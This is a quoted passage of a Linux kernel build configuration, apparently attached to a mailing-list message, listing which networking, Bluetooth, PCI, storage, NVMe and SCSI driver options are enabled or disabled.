> # CONFIG_BAYCOM_SER_FDX is not set
> # CONFIG_BAYCOM_SER_HDX is not set
> # CONFIG_BAYCOM_PAR is not set
> # CONFIG_YAM is not set
> # end of AX.25 network device drivers
>=20
> CONFIG_CAN=3Dy
> CONFIG_CAN_RAW=3Dy
> CONFIG_CAN_BCM=3Dy
> CONFIG_CAN_GW=3Dy
> CONFIG_CAN_J1939=3Dy
> CONFIG_CAN_ISOTP=3Dy
> CONFIG_BT=3Dy
> CONFIG_BT_BREDR=3Dy
> CONFIG_BT_RFCOMM=3Dy
> CONFIG_BT_RFCOMM_TTY=3Dy
> CONFIG_BT_BNEP=3Dy
> CONFIG_BT_BNEP_MC_FILTER=3Dy
> CONFIG_BT_BNEP_PROTO_FILTER=3Dy
> CONFIG_BT_HIDP=3Dy
> CONFIG_BT_LE=3Dy
> CONFIG_BT_LE_L2CAP_ECRED=3Dy
> CONFIG_BT_6LOWPAN=3Dy
> CONFIG_BT_LEDS=3Dy
> CONFIG_BT_MSFTEXT=3Dy
> # CONFIG_BT_AOSPEXT is not set
> # CONFIG_BT_DEBUGFS is not set
> # CONFIG_BT_SELFTEST is not set
>=20
> #
> # Bluetooth device drivers
> #
> CONFIG_BT_INTEL=3Dy
> CONFIG_BT_BCM=3Dy
> CONFIG_BT_RTL=3Dy
> CONFIG_BT_QCA=3Dy
> CONFIG_BT_MTK=3Dy
> CONFIG_BT_HCIBTUSB=3Dy
> CONFIG_BT_HCIBTUSB_AUTOSUSPEND=3Dy
> CONFIG_BT_HCIBTUSB_POLL_SYNC=3Dy
> CONFIG_BT_HCIBTUSB_BCM=3Dy
> CONFIG_BT_HCIBTUSB_MTK=3Dy
> CONFIG_BT_HCIBTUSB_RTL=3Dy
> # CONFIG_BT_HCIBTSDIO is not set
> CONFIG_BT_HCIUART=3Dy
> CONFIG_BT_HCIUART_SERDEV=3Dy
> CONFIG_BT_HCIUART_H4=3Dy
> # CONFIG_BT_HCIUART_NOKIA is not set
> CONFIG_BT_HCIUART_BCSP=3Dy
> # CONFIG_BT_HCIUART_ATH3K is not set
> CONFIG_BT_HCIUART_LL=3Dy
> CONFIG_BT_HCIUART_3WIRE=3Dy
> # CONFIG_BT_HCIUART_INTEL is not set
> # CONFIG_BT_HCIUART_BCM is not set
> # CONFIG_BT_HCIUART_RTL is not set
> CONFIG_BT_HCIUART_QCA=3Dy
> CONFIG_BT_HCIUART_AG6XX=3Dy
> CONFIG_BT_HCIUART_MRVL=3Dy
> # CONFIG_BT_HCIUART_AML is not set
> CONFIG_BT_HCIBCM203X=3Dy
> # CONFIG_BT_HCIBCM4377 is not set
> CONFIG_BT_HCIBPA10X=3Dy
> CONFIG_BT_HCIBFUSB=3Dy
> # CONFIG_BT_HCIDTL1 is not set
> # CONFIG_BT_HCIBT3C is not set
> # CONFIG_BT_HCIBLUECARD is not set
> CONFIG_BT_HCIVHCI=3Dy
> CONFIG_BT_MRVL=3Dy
> CONFIG_BT_MRVL_SDIO=3Dy
> CONFIG_BT_ATH3K=3Dy
> CONFIG_BT_MTKSDIO=3Dy
> CONFIG_BT_MTKUART=3Dy
> # CONFIG_BT_VIRTIO is not set
> # CONFIG_BT_NXPUART is not set
> # CONFIG_BT_INTEL_PCIE is not set
> # end of Bluetooth device drivers
>=20
> CONFIG_AF_RXRPC=3Dy
> CONFIG_AF_RXRPC_IPV6=3Dy
> # CONFIG_AF_RXRPC_INJECT_LOSS is not set
> # CONFIG_AF_RXRPC_INJECT_RX_DELAY is not set
> # CONFIG_AF_RXRPC_DEBUG is not set
> CONFIG_RXKAD=3Dy
> # CONFIG_RXGK is not set
> # CONFIG_RXPERF is not set
> CONFIG_AF_KCM=3Dy
> CONFIG_STREAM_PARSER=3Dy
> CONFIG_MCTP=3Dy
> CONFIG_FIB_RULES=3Dy
> CONFIG_WIRELESS=3Dy
> CONFIG_WEXT_CORE=3Dy
> CONFIG_WEXT_PROC=3Dy
> CONFIG_CFG80211=3Dy
> # CONFIG_NL80211_TESTMODE is not set
> # CONFIG_CFG80211_DEVELOPER_WARNINGS is not set
> # CONFIG_CFG80211_CERTIFICATION_ONUS is not set
> CONFIG_CFG80211_REQUIRE_SIGNED_REGDB=3Dy
> CONFIG_CFG80211_USE_KERNEL_REGDB_KEYS=3Dy
> CONFIG_CFG80211_DEFAULT_PS=3Dy
> CONFIG_CFG80211_DEBUGFS=3Dy
> CONFIG_CFG80211_CRDA_SUPPORT=3Dy
> CONFIG_CFG80211_WEXT=3Dy
> CONFIG_MAC80211=3Dy
> CONFIG_MAC80211_HAS_RC=3Dy
> CONFIG_MAC80211_RC_MINSTREL=3Dy
> CONFIG_MAC80211_RC_DEFAULT_MINSTREL=3Dy
> CONFIG_MAC80211_RC_DEFAULT=3D"minstrel_ht"
> CONFIG_MAC80211_MESH=3Dy
> CONFIG_MAC80211_LEDS=3Dy
> CONFIG_MAC80211_DEBUGFS=3Dy
> # CONFIG_MAC80211_MESSAGE_TRACING is not set
> # CONFIG_MAC80211_DEBUG_MENU is not set
> CONFIG_MAC80211_STA_HASH_MAX_SIZE=3D0
> CONFIG_RFKILL=3Dy
> CONFIG_RFKILL_LEDS=3Dy
> CONFIG_RFKILL_INPUT=3Dy
> # CONFIG_RFKILL_GPIO is not set
> CONFIG_NET_9P=3Dy
> CONFIG_NET_9P_FD=3Dy
> CONFIG_NET_9P_VIRTIO=3Dy
> # CONFIG_NET_9P_USBG is not set
> CONFIG_NET_9P_RDMA=3Dy
> # CONFIG_NET_9P_DEBUG is not set
> CONFIG_CAIF=3Dy
> CONFIG_CAIF_DEBUG=3Dy
> CONFIG_CAIF_NETDEV=3Dy
> CONFIG_CAIF_USB=3Dy
> CONFIG_CEPH_LIB=3Dy
> # CONFIG_CEPH_LIB_PRETTYDEBUG is not set
> CONFIG_CEPH_LIB_USE_DNS_RESOLVER=3Dy
> CONFIG_NFC=3Dy
> CONFIG_NFC_DIGITAL=3Dy
> CONFIG_NFC_NCI=3Dy
> # CONFIG_NFC_NCI_SPI is not set
> CONFIG_NFC_NCI_UART=3Dy
> CONFIG_NFC_HCI=3Dy
> CONFIG_NFC_SHDLC=3Dy
>=20
> #
> # Near Field Communication (NFC) devices
> #
> # CONFIG_NFC_TRF7970A is not set
> # CONFIG_NFC_MEI_PHY is not set
> CONFIG_NFC_SIM=3Dy
> CONFIG_NFC_PORT100=3Dy
> CONFIG_NFC_VIRTUAL_NCI=3Dy
> CONFIG_NFC_FDP=3Dy
> # CONFIG_NFC_FDP_I2C is not set
> # CONFIG_NFC_PN544_I2C is not set
> CONFIG_NFC_PN533=3Dy
> CONFIG_NFC_PN533_USB=3Dy
> # CONFIG_NFC_PN533_I2C is not set
> # CONFIG_NFC_PN532_UART is not set
> # CONFIG_NFC_MICROREAD_I2C is not set
> CONFIG_NFC_MRVL=3Dy
> CONFIG_NFC_MRVL_USB=3Dy
> # CONFIG_NFC_MRVL_UART is not set
> # CONFIG_NFC_MRVL_I2C is not set
> # CONFIG_NFC_ST21NFCA_I2C is not set
> # CONFIG_NFC_ST_NCI_I2C is not set
> # CONFIG_NFC_ST_NCI_SPI is not set
> # CONFIG_NFC_NXP_NCI is not set
> # CONFIG_NFC_S3FWRN5_I2C is not set
> # CONFIG_NFC_S3FWRN82_UART is not set
> # CONFIG_NFC_ST95HF is not set
> # end of Near Field Communication (NFC) devices
>=20
> CONFIG_PSAMPLE=3Dy
> CONFIG_NET_IFE=3Dy
> CONFIG_LWTUNNEL=3Dy
> CONFIG_LWTUNNEL_BPF=3Dy
> CONFIG_DST_CACHE=3Dy
> CONFIG_GRO_CELLS=3Dy
> CONFIG_SOCK_VALIDATE_XMIT=3Dy
> CONFIG_NET_SELFTESTS=3Dy
> CONFIG_NET_SOCK_MSG=3Dy
> CONFIG_NET_DEVLINK=3Dy
> CONFIG_PAGE_POOL=3Dy
> # CONFIG_PAGE_POOL_STATS is not set
> CONFIG_FAILOVER=3Dy
> CONFIG_ETHTOOL_NETLINK=3Dy
>=20
> #
> # Device Drivers
> #
> CONFIG_HAVE_PCI=3Dy
> CONFIG_GENERIC_PCI_IOMAP=3Dy
> CONFIG_PCI=3Dy
> CONFIG_PCI_DOMAINS=3Dy
> CONFIG_PCIEPORTBUS=3Dy
> CONFIG_HOTPLUG_PCI_PCIE=3Dy
> CONFIG_PCIEAER=3Dy
> # CONFIG_PCIEAER_INJECT is not set
> # CONFIG_PCIE_ECRC is not set
> CONFIG_PCIEASPM=3Dy
> CONFIG_PCIEASPM_DEFAULT=3Dy
> # CONFIG_PCIEASPM_POWERSAVE is not set
> # CONFIG_PCIEASPM_POWER_SUPERSAVE is not set
> # CONFIG_PCIEASPM_PERFORMANCE is not set
> CONFIG_PCIE_PME=3Dy
> # CONFIG_PCIE_DPC is not set
> # CONFIG_PCIE_PTM is not set
> CONFIG_PCI_MSI=3Dy
> CONFIG_PCI_QUIRKS=3Dy
> # CONFIG_PCI_DEBUG is not set
> # CONFIG_PCI_REALLOC_ENABLE_AUTO is not set
> # CONFIG_PCI_STUB is not set
> # CONFIG_PCI_PF_STUB is not set
> CONFIG_PCI_ATS=3Dy
> # CONFIG_PCI_TSM is not set
> # CONFIG_PCI_DOE is not set
> CONFIG_PCI_ECAM=3Dy
> CONFIG_PCI_LOCKLESS_CONFIG=3Dy
> CONFIG_PCI_IOV=3Dy
> # CONFIG_PCI_NPEM is not set
> CONFIG_PCI_PRI=3Dy
> CONFIG_PCI_PASID=3Dy
> # CONFIG_PCIE_TPH is not set
> # CONFIG_PCI_P2PDMA is not set
> CONFIG_PCI_LABEL=3Dy
> # CONFIG_PCI_DYNAMIC_OF_NODES is not set
> # CONFIG_PCIE_BUS_TUNE_OFF is not set
> CONFIG_PCIE_BUS_DEFAULT=3Dy
> # CONFIG_PCIE_BUS_SAFE is not set
> # CONFIG_PCIE_BUS_PERFORMANCE is not set
> # CONFIG_PCIE_BUS_PEER2PEER is not set
> CONFIG_VGA_ARB=3Dy
> CONFIG_VGA_ARB_MAX_GPUS=3D16
> CONFIG_HOTPLUG_PCI=3Dy
> # CONFIG_HOTPLUG_PCI_ACPI is not set
> # CONFIG_HOTPLUG_PCI_CPCI is not set
> # CONFIG_HOTPLUG_PCI_OCTEONEP is not set
> # CONFIG_HOTPLUG_PCI_SHPC is not set
>=20
> #
> # PCI controller drivers
> #
> CONFIG_PCI_HOST_COMMON=3Dy
> # CONFIG_PCI_FTPCI100 is not set
> CONFIG_PCI_HOST_GENERIC=3Dy
> # CONFIG_VMD is not set
> # CONFIG_PCIE_XILINX is not set
>=20
> #
> # Cadence-based PCIe controllers
> #
> # CONFIG_PCIE_CADENCE_PLAT_HOST is not set
> # CONFIG_PCIE_CADENCE_PLAT_EP is not set
> # end of Cadence-based PCIe controllers
>=20
> #
> # DesignWare-based PCIe controllers
> #
> # CONFIG_PCI_MESON is not set
> # CONFIG_PCIE_INTEL_GW is not set
> # CONFIG_PCIE_DW_PLAT_HOST is not set
> # CONFIG_PCIE_DW_PLAT_EP is not set
> # end of DesignWare-based PCIe controllers
>=20
> #
> # Mobiveil-based PCIe controllers
> #
> # end of Mobiveil-based PCIe controllers
>=20
> #
> # PLDA-based PCIe controllers
> #
> # CONFIG_PCIE_MICROCHIP_HOST is not set
> # end of PLDA-based PCIe controllers
> # end of PCI controller drivers
>=20
> #
> # PCI Endpoint
> #
> CONFIG_PCI_ENDPOINT=3Dy
> # CONFIG_PCI_ENDPOINT_CONFIGFS is not set
> # CONFIG_PCI_ENDPOINT_MSI_DOORBELL is not set
> # CONFIG_PCI_EPF_TEST is not set
> # CONFIG_PCI_EPF_NTB is not set
> # end of PCI Endpoint
>=20
> #
> # PCI switch controller drivers
> #
> # CONFIG_PCI_SW_SWITCHTEC is not set
> # end of PCI switch controller drivers
>=20
> # CONFIG_PCI_PWRCTRL_SLOT is not set
> # CONFIG_PCI_PWRCTRL_TC9563 is not set
> # CONFIG_CXL_BUS is not set
> CONFIG_PCCARD=3Dy
> CONFIG_PCMCIA=3Dy
> CONFIG_PCMCIA_LOAD_CIS=3Dy
> CONFIG_CARDBUS=3Dy
>=20
> #
> # PC-card bridges
> #
> CONFIG_YENTA=3Dy
> CONFIG_YENTA_O2=3Dy
> CONFIG_YENTA_RICOH=3Dy
> CONFIG_YENTA_TI=3Dy
> CONFIG_YENTA_ENE_TUNE=3Dy
> CONFIG_YENTA_TOSHIBA=3Dy
> # CONFIG_PD6729 is not set
> # CONFIG_I82092 is not set
> CONFIG_PCCARD_NONSTATIC=3Dy
> # CONFIG_RAPIDIO is not set
> # CONFIG_PC104 is not set
>=20
> #
> # Generic Driver Options
> #
> CONFIG_AUXILIARY_BUS=3Dy
> CONFIG_UEVENT_HELPER=3Dy
> CONFIG_UEVENT_HELPER_PATH=3D"/sbin/hotplug"
> CONFIG_DEVTMPFS=3Dy
> CONFIG_DEVTMPFS_MOUNT=3Dy
> # CONFIG_DEVTMPFS_SAFE is not set
> CONFIG_STANDALONE=3Dy
> CONFIG_PREVENT_FIRMWARE_BUILD=3Dy
>=20
> #
> # Firmware loader
> #
> CONFIG_FW_LOADER=3Dy
> # CONFIG_FW_LOADER_DEBUG is not set
> CONFIG_FW_LOADER_PAGED_BUF=3Dy
> CONFIG_FW_LOADER_SYSFS=3Dy
> CONFIG_EXTRA_FIRMWARE=3D""
> CONFIG_FW_LOADER_USER_HELPER=3Dy
> CONFIG_FW_LOADER_USER_HELPER_FALLBACK=3Dy
> CONFIG_FW_LOADER_COMPRESS=3Dy
> # CONFIG_FW_LOADER_COMPRESS_XZ is not set
> # CONFIG_FW_LOADER_COMPRESS_ZSTD is not set
> CONFIG_FW_CACHE=3Dy
> # CONFIG_FW_UPLOAD is not set
> # end of Firmware loader
>=20
> CONFIG_WANT_DEV_COREDUMP=3Dy
> CONFIG_ALLOW_DEV_COREDUMP=3Dy
> CONFIG_DEV_COREDUMP=3Dy
> # CONFIG_DEBUG_DRIVER is not set
> CONFIG_DEBUG_DEVRES=3Dy
> # CONFIG_DEBUG_TEST_DRIVER_REMOVE is not set
> # CONFIG_TEST_ASYNC_DRIVER_PROBE is not set
> CONFIG_GENERIC_CPU_DEVICES=3Dy
> CONFIG_GENERIC_CPU_AUTOPROBE=3Dy
> CONFIG_GENERIC_CPU_VULNERABILITIES=3Dy
> CONFIG_REGMAP=3Dy
> CONFIG_REGMAP_I2C=3Dy
> CONFIG_REGMAP_SPI=3Dy
> CONFIG_REGMAP_MMIO=3Dy
> CONFIG_REGMAP_IRQ=3Dy
> CONFIG_DMA_SHARED_BUFFER=3Dy
> # CONFIG_DMA_FENCE_TRACE is not set
> # CONFIG_FW_DEVLINK_SYNC_STATE_TIMEOUT is not set
> # end of Generic Driver Options
>=20
> #
> # Bus devices
> #
> # CONFIG_MOXTET is not set
> CONFIG_MHI_BUS=3Dy
> # CONFIG_MHI_BUS_DEBUG is not set
> # CONFIG_MHI_BUS_PCI_GENERIC is not set
> # CONFIG_MHI_BUS_EP is not set
> # end of Bus devices
>=20
> CONFIG_CONNECTOR=3Dy
> CONFIG_PROC_EVENTS=3Dy
>=20
> #
> # Firmware Drivers
> #
>=20
> #
> # ARM System Control and Management Interface Protocol
> #
> # end of ARM System Control and Management Interface Protocol
>=20
> # CONFIG_EDD is not set
> CONFIG_FIRMWARE_MEMMAP=3Dy
> CONFIG_DMIID=3Dy
> # CONFIG_DMI_SYSFS is not set
> CONFIG_DMI_SCAN_MACHINE_NON_EFI_FALLBACK=3Dy
> # CONFIG_ISCSI_IBFT is not set
> # CONFIG_FW_CFG_SYSFS is not set
> CONFIG_SYSFB=3Dy
> # CONFIG_SYSFB_SIMPLEFB is not set
> CONFIG_GOOGLE_FIRMWARE=3Dy
> # CONFIG_GOOGLE_SMI is not set
> # CONFIG_GOOGLE_CBMEM is not set
> CONFIG_GOOGLE_COREBOOT_TABLE=3Dy
> CONFIG_GOOGLE_MEMCONSOLE=3Dy
> # CONFIG_GOOGLE_MEMCONSOLE_X86_LEGACY is not set
> # CONFIG_GOOGLE_FRAMEBUFFER_COREBOOT is not set
> CONFIG_GOOGLE_MEMCONSOLE_COREBOOT=3Dy
> CONFIG_GOOGLE_VPD=3Dy
>=20
> #
> # Qualcomm firmware drivers
> #
> # end of Qualcomm firmware drivers
>=20
> #
> # Tegra firmware driver
> #
> # end of Tegra firmware driver
> # end of Firmware Drivers
>=20
> # CONFIG_FWCTL is not set
> CONFIG_GNSS=3Dy
> # CONFIG_GNSS_MTK_SERIAL is not set
> # CONFIG_GNSS_SIRF_SERIAL is not set
> # CONFIG_GNSS_UBX_SERIAL is not set
> CONFIG_GNSS_USB=3Dy
> CONFIG_MTD=3Dy
> # CONFIG_MTD_TESTS is not set
>=20
> #
> # Partition parsers
> #
> # CONFIG_MTD_CMDLINE_PARTS is not set
> # CONFIG_MTD_OF_PARTS is not set
> # CONFIG_MTD_REDBOOT_PARTS is not set
> # end of Partition parsers
>=20
> #
> # User Modules And Translation Layers
> #
> CONFIG_MTD_BLKDEVS=3Dy
> CONFIG_MTD_BLOCK=3Dy
>=20
> #
> # Note that in some cases UBI block is preferred. See MTD_UBI_BLOCK.
> #
> CONFIG_FTL=3Dy
> # CONFIG_NFTL is not set
> # CONFIG_INFTL is not set
> # CONFIG_RFD_FTL is not set
> # CONFIG_SSFDC is not set
> # CONFIG_SM_FTL is not set
> # CONFIG_MTD_OOPS is not set
> # CONFIG_MTD_SWAP is not set
> # CONFIG_MTD_PARTITIONED_MASTER is not set
>=20
> #
> # RAM/ROM/Flash chip drivers
> #
> # CONFIG_MTD_CFI is not set
> # CONFIG_MTD_JEDECPROBE is not set
> CONFIG_MTD_MAP_BANK_WIDTH_1=3Dy
> CONFIG_MTD_MAP_BANK_WIDTH_2=3Dy
> CONFIG_MTD_MAP_BANK_WIDTH_4=3Dy
> CONFIG_MTD_CFI_I1=3Dy
> CONFIG_MTD_CFI_I2=3Dy
> # CONFIG_MTD_RAM is not set
> # CONFIG_MTD_ROM is not set
> # CONFIG_MTD_ABSENT is not set
> # end of RAM/ROM/Flash chip drivers
>=20
> #
> # Mapping drivers for chip access
> #
> # CONFIG_MTD_COMPLEX_MAPPINGS is not set
> # CONFIG_MTD_PLATRAM is not set
> # end of Mapping drivers for chip access
>=20
> #
> # Self-contained MTD device drivers
> #
> # CONFIG_MTD_PMC551 is not set
> # CONFIG_MTD_DATAFLASH is not set
> # CONFIG_MTD_MCHP23K256 is not set
> # CONFIG_MTD_MCHP48L640 is not set
> # CONFIG_MTD_SST25L is not set
> CONFIG_MTD_SLRAM=3Dy
> CONFIG_MTD_PHRAM=3Dy
> CONFIG_MTD_MTDRAM=3Dy
> CONFIG_MTDRAM_TOTAL_SIZE=3D128
> CONFIG_MTDRAM_ERASE_SIZE=3D4
> CONFIG_MTD_BLOCK2MTD=3Dy
> # CONFIG_MTD_INTEL_DG is not set
>=20
> #
> # Disk-On-Chip Device Drivers
> #
> # CONFIG_MTD_DOCG3 is not set
> # end of Self-contained MTD device drivers
>=20
> #
> # NAND
> #
> # CONFIG_MTD_ONENAND is not set
> # CONFIG_MTD_RAW_NAND is not set
> # CONFIG_MTD_SPI_NAND is not set
>=20
> #
> # ECC engine support
> #
> # CONFIG_MTD_NAND_ECC_SW_HAMMING is not set
> # CONFIG_MTD_NAND_ECC_SW_BCH is not set
> # CONFIG_MTD_NAND_ECC_MXIC is not set
> # end of ECC engine support
> # end of NAND
>=20
> #
> # LPDDR & LPDDR2 PCM memory drivers
> #
> # CONFIG_MTD_LPDDR is not set
> # end of LPDDR & LPDDR2 PCM memory drivers
>=20
> # CONFIG_MTD_SPI_NOR is not set
> CONFIG_MTD_UBI=3Dy
> CONFIG_MTD_UBI_WL_THRESHOLD=3D4096
> CONFIG_MTD_UBI_BEB_LIMIT=3D20
> # CONFIG_MTD_UBI_FASTMAP is not set
> # CONFIG_MTD_UBI_GLUEBI is not set
> # CONFIG_MTD_UBI_BLOCK is not set
> # CONFIG_MTD_UBI_FAULT_INJECTION is not set
> # CONFIG_MTD_UBI_NVMEM is not set
> # CONFIG_MTD_HYPERBUS is not set
> CONFIG_DTC=3Dy
> CONFIG_OF=3Dy
> # CONFIG_OF_UNITTEST is not set
> CONFIG_OF_FLATTREE=3Dy
> CONFIG_OF_EARLY_FLATTREE=3Dy
> CONFIG_OF_KOBJ=3Dy
> CONFIG_OF_ADDRESS=3Dy
> CONFIG_OF_IRQ=3Dy
> CONFIG_OF_RESERVED_MEM=3Dy
> # CONFIG_OF_OVERLAY is not set
> CONFIG_OF_NUMA=3Dy
> CONFIG_ARCH_MIGHT_HAVE_PC_PARPORT=3Dy
> CONFIG_PARPORT=3Dy
> # CONFIG_PARPORT_PC is not set
> # CONFIG_PARPORT_1284 is not set
> CONFIG_PARPORT_NOT_PC=3Dy
> CONFIG_PNP=3Dy
> CONFIG_PNP_DEBUG_MESSAGES=3Dy
>=20
> #
> # Protocols
> #
> CONFIG_PNPACPI=3Dy
> CONFIG_BLK_DEV=3Dy
> CONFIG_BLK_DEV_NULL_BLK=3Dy
> CONFIG_BLK_DEV_NULL_BLK_FAULT_INJECTION=3Dy
> # CONFIG_BLK_DEV_FD is not set
> CONFIG_CDROM=3Dy
> # CONFIG_BLK_DEV_PCIESSD_MTIP32XX is not set
> CONFIG_ZRAM=3Dy
> # CONFIG_ZRAM_BACKEND_LZ4 is not set
> # CONFIG_ZRAM_BACKEND_LZ4HC is not set
> # CONFIG_ZRAM_BACKEND_ZSTD is not set
> # CONFIG_ZRAM_BACKEND_DEFLATE is not set
> # CONFIG_ZRAM_BACKEND_842 is not set
> CONFIG_ZRAM_BACKEND_FORCE_LZO=3Dy
> CONFIG_ZRAM_BACKEND_LZO=3Dy
> # CONFIG_ZRAM_DEF_COMP_LZORLE is not set
> CONFIG_ZRAM_DEF_COMP_LZO=3Dy
> CONFIG_ZRAM_DEF_COMP=3D"lzo"
> # CONFIG_ZRAM_WRITEBACK is not set
> # CONFIG_ZRAM_TRACK_ENTRY_ACTIME is not set
> # CONFIG_ZRAM_MEMORY_TRACKING is not set
> # CONFIG_ZRAM_MULTI_COMP is not set
> CONFIG_BLK_DEV_LOOP=3Dy
> CONFIG_BLK_DEV_LOOP_MIN_COUNT=3D16
> # CONFIG_BLK_DEV_DRBD is not set
> CONFIG_BLK_DEV_NBD=3Dy
> CONFIG_BLK_DEV_RAM=3Dy
> CONFIG_BLK_DEV_RAM_COUNT=3D16
> CONFIG_BLK_DEV_RAM_SIZE=3D4096
> CONFIG_ATA_OVER_ETH=3Dy
> CONFIG_VIRTIO_BLK=3Dy
> # CONFIG_BLK_DEV_RBD is not set
> # CONFIG_BLK_DEV_UBLK is not set
> CONFIG_BLK_DEV_RNBD=3Dy
> CONFIG_BLK_DEV_RNBD_CLIENT=3Dy
> # CONFIG_BLK_DEV_ZONED_LOOP is not set
>=20
> #
> # NVME Support
> #
> CONFIG_NVME_CORE=3Dy
> CONFIG_BLK_DEV_NVME=3Dy
> CONFIG_NVME_MULTIPATH=3Dy
> # CONFIG_NVME_VERBOSE_ERRORS is not set
> # CONFIG_NVME_HWMON is not set
> CONFIG_NVME_FABRICS=3Dy
> CONFIG_NVME_RDMA=3Dy
> CONFIG_NVME_FC=3Dy
> CONFIG_NVME_TCP=3Dy
> # CONFIG_NVME_TCP_TLS is not set
> # CONFIG_NVME_HOST_AUTH is not set
> CONFIG_NVME_TARGET=3Dy
> # CONFIG_NVME_TARGET_DEBUGFS is not set
> # CONFIG_NVME_TARGET_PASSTHRU is not set
> CONFIG_NVME_TARGET_LOOP=3Dy
> CONFIG_NVME_TARGET_RDMA=3Dy
> CONFIG_NVME_TARGET_FC=3Dy
> CONFIG_NVME_TARGET_FCLOOP=3Dy
> CONFIG_NVME_TARGET_TCP=3Dy
> # CONFIG_NVME_TARGET_TCP_TLS is not set
> # CONFIG_NVME_TARGET_AUTH is not set
> # CONFIG_NVME_TARGET_PCI_EPF is not set
> # end of NVME Support
>=20
> #
> # Misc devices
> #
> # CONFIG_AD525X_DPOT is not set
> # CONFIG_DUMMY_IRQ is not set
> # CONFIG_IBM_ASM is not set
> # CONFIG_PHANTOM is not set
> # CONFIG_RPMB is not set
> # CONFIG_TI_FPC202 is not set
> # CONFIG_TIFM_CORE is not set
> # CONFIG_ICS932S401 is not set
> # CONFIG_ENCLOSURE_SERVICES is not set
> # CONFIG_HP_ILO is not set
> # CONFIG_APDS9802ALS is not set
> # CONFIG_ISL29003 is not set
> # CONFIG_ISL29020 is not set
> # CONFIG_SENSORS_TSL2550 is not set
> # CONFIG_SENSORS_BH1770 is not set
> # CONFIG_SENSORS_APDS990X is not set
> # CONFIG_HMC6352 is not set
> # CONFIG_DS1682 is not set
> # CONFIG_VMWARE_BALLOON is not set
> # CONFIG_LATTICE_ECP3_CONFIG is not set
> # CONFIG_SRAM is not set
> # CONFIG_DW_XDATA_PCIE is not set
> # CONFIG_PCI_ENDPOINT_TEST is not set
> # CONFIG_XILINX_SDFEC is not set
> CONFIG_MISC_RTSX=3Dy
> # CONFIG_HISI_HIKEY_USB is not set
> # CONFIG_OPEN_DICE is not set
> # CONFIG_NTSYNC is not set
> # CONFIG_VCPU_STALL_DETECTOR is not set
> # CONFIG_NSM is not set
> # CONFIG_C2PORT is not set
>=20
> #
> # EEPROM support
> #
> # CONFIG_EEPROM_AT24 is not set
> # CONFIG_EEPROM_AT25 is not set
> # CONFIG_EEPROM_MAX6875 is not set
> CONFIG_EEPROM_93CX6=3Dy
> # CONFIG_EEPROM_93XX46 is not set
> # CONFIG_EEPROM_IDT_89HPESX is not set
> # CONFIG_EEPROM_EE1004 is not set
> # CONFIG_EEPROM_M24LR is not set
> # end of EEPROM support
>=20
> # CONFIG_CB710_CORE is not set
> # CONFIG_SENSORS_LIS3_I2C is not set
> # CONFIG_ALTERA_STAPL is not set
> CONFIG_INTEL_MEI=3Dy
> CONFIG_INTEL_MEI_ME=3Dy
> # CONFIG_INTEL_MEI_TXE is not set
> # CONFIG_INTEL_MEI_GSC is not set
> # CONFIG_INTEL_MEI_VSC_HW is not set
> # CONFIG_INTEL_MEI_HDCP is not set
> # CONFIG_INTEL_MEI_PXP is not set
> # CONFIG_INTEL_MEI_GSC_PROXY is not set
> CONFIG_VMWARE_VMCI=3Dy
> # CONFIG_GENWQE is not set
> # CONFIG_BCM_VK is not set
> # CONFIG_MISC_ALCOR_PCI is not set
> # CONFIG_MISC_RTSX_PCI is not set
> CONFIG_MISC_RTSX_USB=3Dy
> # CONFIG_UACCE is not set
> # CONFIG_PVPANIC is not set
> # CONFIG_GP_PCI1XXXX is not set
> # CONFIG_KEBA_CP500 is not set
> # CONFIG_MISC_RP1 is not set
> # end of Misc devices
>=20
> #
> # SCSI device support
> #
> CONFIG_SCSI_MOD=3Dy
> CONFIG_RAID_ATTRS=3Dy
> CONFIG_SCSI_COMMON=3Dy
> CONFIG_SCSI=3Dy
> CONFIG_SCSI_DMA=3Dy
> CONFIG_SCSI_NETLINK=3Dy
> CONFIG_SCSI_PROC_FS=3Dy
>=20
> #
> # SCSI support type (disk, tape, CD-ROM)
> #
> CONFIG_BLK_DEV_SD=3Dy
> CONFIG_CHR_DEV_ST=3Dy
> CONFIG_BLK_DEV_SR=3Dy
> CONFIG_CHR_DEV_SG=3Dy
> CONFIG_BLK_DEV_BSG=3Dy
> # CONFIG_CHR_DEV_SCH is not set
> CONFIG_SCSI_CONSTANTS=3Dy
> CONFIG_SCSI_LOGGING=3Dy
> CONFIG_SCSI_SCAN_ASYNC=3Dy
>=20
> #
> # SCSI Transports
> #
> CONFIG_SCSI_SPI_ATTRS=3Dy
> CONFIG_SCSI_FC_ATTRS=3Dy
> CONFIG_SCSI_ISCSI_ATTRS=3Dy
> CONFIG_SCSI_SAS_ATTRS=3Dy
> CONFIG_SCSI_SAS_LIBSAS=3Dy
> CONFIG_SCSI_SAS_ATA=3Dy
> # CONFIG_SCSI_SAS_HOST_SMP is not set
> CONFIG_SCSI_SRP_ATTRS=3Dy
> # end of SCSI Transports
>=20
> CONFIG_SCSI_LOWLEVEL=3Dy
> # CONFIG_ISCSI_TCP is not set
> # CONFIG_ISCSI_BOOT_SYSFS is not set
> # CONFIG_SCSI_CXGB3_ISCSI is not set
> # CONFIG_SCSI_CXGB4_ISCSI is not set
> # CONFIG_SCSI_BNX2_ISCSI is not set
> # CONFIG_BE2ISCSI is not set
> # CONFIG_BLK_DEV_3W_XXXX_RAID is not set
> CONFIG_SCSI_HPSA=3Dy
> # CONFIG_SCSI_3W_9XXX is not set
> # CONFIG_SCSI_3W_SAS is not set
> # CONFIG_SCSI_ACARD is not set
> # CONFIG_SCSI_AACRAID is not set
> # CONFIG_SCSI_AIC7XXX is not set
> # CONFIG_SCSI_AIC79XX is not set
> # CONFIG_SCSI_AIC94XX is not set
> # CONFIG_SCSI_MVSAS is not set
> # CONFIG_SCSI_MVUMI is not set
> # CONFIG_SCSI_ADVANSYS is not set
> # CONFIG_SCSI_ARCMSR is not set
> # CONFIG_SCSI_ESAS2R is not set
> # CONFIG_MEGARAID_NEWGEN is not set
> # CONFIG_MEGARAID_LEGACY is not set
> # CONFIG_MEGARAID_SAS is not set
> # CONFIG_SCSI_MPT3SAS is not set
> # CONFIG_SCSI_MPT2SAS is not set
> # CONFIG_SCSI_MPI3MR is not set
> # CONFIG_SCSI_SMARTPQI is not set
> # CONFIG_SCSI_HPTIOP is not set
> # CONFIG_SCSI_BUSLOGIC is not set
> # CONFIG_SCSI_MYRB is not set
> # CONFIG_SCSI_MYRS is not set
> # CONFIG_VMWARE_PVSCSI is not set
> # CONFIG_LIBFC is not set
> # CONFIG_SCSI_SNIC is not set
> # CONFIG_SCSI_DMX3191D is not set
> # CONFIG_SCSI_FDOMAIN_PCI is not set
